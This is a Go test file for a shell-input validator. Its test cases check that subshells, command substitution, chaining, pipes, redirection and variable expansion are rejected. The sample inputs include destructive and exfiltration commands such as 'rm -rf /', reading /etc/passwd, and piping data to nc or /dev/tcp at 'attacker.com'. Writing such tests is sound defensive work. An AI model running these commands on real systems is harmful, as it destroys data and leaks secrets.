package validate

import (
	"testing"
)

func TestValidate(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{
			name:    "empty string",
			input:   "",
			wantErr: false,
		},
		{
			name:    "simple command",
			input:   "ls -la",
			wantErr: false,
		},
		{
			name:    "command with flags",
			input:   "git status --short",
			wantErr: false,
		},
		{
			name:    "path with spaces",
			input:   "/path/to/file with spaces",
			wantErr: false,
		},
		{
			name:    "single word",
			input:   "hello",
			wantErr: false,
		},
		{
			name:    "numbers and symbols",
			input:   "123-456_789@domain.com",
			wantErr: false,
		},
		{
			name:    "contains 'and' without semicolon",
			input:   "command with and in name",
			wantErr: false,
		},
		{
			name:    "contains 'or' without semicolon",
			input:   "command with or in name",
			wantErr: false,
		},
		{
			name:    "parentheses in middle of word",
			input:   "test(ing)",
			wantErr: true,
		},
		{
			name:    "simple subshell",
			input:   "(ls)",
			wantErr: true,
		},
		{
			name:    "subshell with command",
			input:   "(echo hello)",
			wantErr: true,
		},
		{
			name:    "nested subshell",
			input:   "((echo nested))",
			wantErr: true,
		},
		{
			name:    "subshell with multiple commands",
			input:   "(ls && echo done)",
			wantErr: true,
		},
		{
			name:    "subshell at end",
			input:   "prefix (command)",
			wantErr: true,
		},
		{
			name:    "subshell at beginning",
			input:   "(command) suffix",
			wantErr: true,
		},
		{
			name:    "multiple subshells",
			input:   "(cmd1) and (cmd2)",
			wantErr: true,
		},
		{
			name:    "semicolon and 'and'",
			input:   "cmd1; and cmd2",
			wantErr: true,
		},
		{
			name:    "semicolon and 'or'",
			input:   "cmd1; or cmd2",
			wantErr: true,
		},
		{
			name:    "semicolon with spaces and 'and'",
			input:   "cmd1 ;  and  cmd2",
			wantErr: true,
		},
		{
			name:    "semicolon with spaces and 'or'",
			input:   "cmd1 ;  or  cmd2",
			wantErr: true,
		},
		{
			name:    "multiple semicolons with and",
			input:   "cmd1; cmd2; and cmd3",
			wantErr: true,
		},
		{
			name:    "multiple semicolons with or",
			input:   "cmd1; cmd2; or cmd3",
			wantErr: true,
		},
		{
			name:    "complex chaining",
			input:   "echo start; and echo middle; or echo end",
			wantErr: true,
		},
		// Edge cases that combine both patterns
		{
			name:    "subshell with command chaining",
			input:   "(echo hello); and echo world",
			wantErr: true,
		},
		{
			name:    "command chaining with subshell",
			input:   "echo start; and (echo subshell)",
			wantErr: true,
		},

		// New injection vulnerabilities - Command substitution
		{
			name:    "command substitution with $()",
			input:   "$(rm -rf /)",
			wantErr: true,
		},
		{
			name:    "command substitution in string",
			input:   "file_$(whoami).txt",
			wantErr: true,
		},
		{
			name:    "backtick command substitution",
			input:   "`whoami`",
			wantErr: true,
		},
		{
			name:    "backtick in filename",
			input:   "file_`date`.log",
			wantErr: true,
		},

		// Command chaining with && and ||
		{
			name:    "logical AND chaining",
			input:   "echo hello && rm file",
			wantErr: true,
		},
		{
			name:    "logical OR chaining",
			input:   "test -f file || touch file",
			wantErr: true,
		},

		// Pipes and redirection
		{
			name:    "pipe to another command",
			input:   "cat file | grep secret",
			wantErr: true,
		},
		{
			name:    "output redirection",
			input:   "echo secret > /tmp/data",
			wantErr: true,
		},
		{
			name:    "input redirection",
			input:   "mail user < /etc/passwd",
			wantErr: true,
		},
		{
			name:    "append redirection",
			input:   "echo data >> ~/.bashrc",
			wantErr: true,
		},

		// Background processes
		{
			name:    "background process",
			input:   "sleep 100 &",
			wantErr: true,
		},

		// Process substitution
		{
			name:    "process substitution input",
			input:   "diff <(cmd1) <(cmd2)",
			wantErr: true,
		},
		{
			name:    "process substitution output",
			input:   "cmd > >(sort)",
			wantErr: true,
		},

		// Variable expansion
		{
			name:    "variable expansion with braces",
			input:   "echo ${HOME}/file",
			wantErr: true,
		},

		// Comment injection
		{
			name:    "comment injection",
			input:   "file; # && rm -rf /",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := Validate(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("Validate(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}

			if tt.wantErr && err != nil {
				expectedPrefix := "input string cannot initialize subshells or run commands:"
				if len(err.Error()) < len(expectedPrefix) || err.Error()[:len(expectedPrefix)] != expectedPrefix {
					t.Errorf("Validate(%q) error message = %q, want it to start with %q", tt.input, err.Error(), expectedPrefix)
				}
			}
		})
	}
}

func TestValidateRegexPatterns(t *testing.T) {
	patterns := []struct {
		name    string
		input   string
		wantErr bool
		desc    string
	}{
		{
			name:    "single parentheses group",
			input:   "(test)",
			wantErr: true,
			desc:    "matches (.*)+",
		},
		{
			name:    "multiple parentheses groups",
			input:   "(first)(second)",
			wantErr: true,
			desc:    "matches (.*)+",
		},
		{
			name:    "parentheses with content",
			input:   "(echo 'hello world')",
			wantErr: true,
			desc:    "matches (.*)+",
		},
		{
			name:    "semicolon followed by and",
			input:   "test; and another",
			wantErr: true,
			desc:    "matches .*;\\s*(and|or)\\s+.*",
		},
		{
			name:    "semicolon followed by or",
			input:   "test; or another",
			wantErr: true,
			desc:    "matches .*;\\s*(and|or)\\s+.*",
		},
		{
			name:    "semicolon with extra spaces",
			input:   "test  ;   and   another",
			wantErr: true,
			desc:    "matches .*;\\s*(and|or)\\s+.* with multiple spaces",
		},

		// Test additional injection patterns
		{
			name:    "command substitution pattern",
			input:   "prefix$(malicious)suffix",
			wantErr: true,
			desc:    "matches command substitution $()",
		},
		{
			name:    "backtick substitution pattern",
			input:   "file_`rm -rf /`_name",
			wantErr: true,
			desc:    "matches backtick command substitution",
		},
		{
			name:    "logical AND pattern",
			input:   "legitimate && malicious",
			wantErr: true,
			desc:    "matches logical AND chaining",
		},
		{
			name:    "pipe pattern",
			input:   "cat data | nc attacker.com 1337",
			wantErr: true,
			desc:    "matches pipe operator",
		},
		{
			name:    "redirection pattern",
			input:   "echo secrets > /dev/tcp/attacker.com/1337",
			wantErr: true,
			desc:    "matches redirection operator",
		},
		{
			name:    "background process pattern",
			input:   "nc -l 1337 &",
			wantErr: true,
			desc:    "matches background process",
		},
		{
			name:    "process substitution pattern",
			input:   "cmd <(malicious)",
			wantErr: true,
			desc:    "matches process substitution",
		},
		{
			name:    "variable expansion pattern",
			input:   "${MALICIOUS}",
			wantErr: true,
			desc:    "matches variable expansion",
		},
	}

	for _, tt := range patterns {
		t.Run(tt.name, func(t *testing.T) {
			err := Validate(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("Validate(%q) error = %v, wantErr %v (%s)", tt.input, err, tt.wantErr, tt.desc)
			}
		})
	}
}
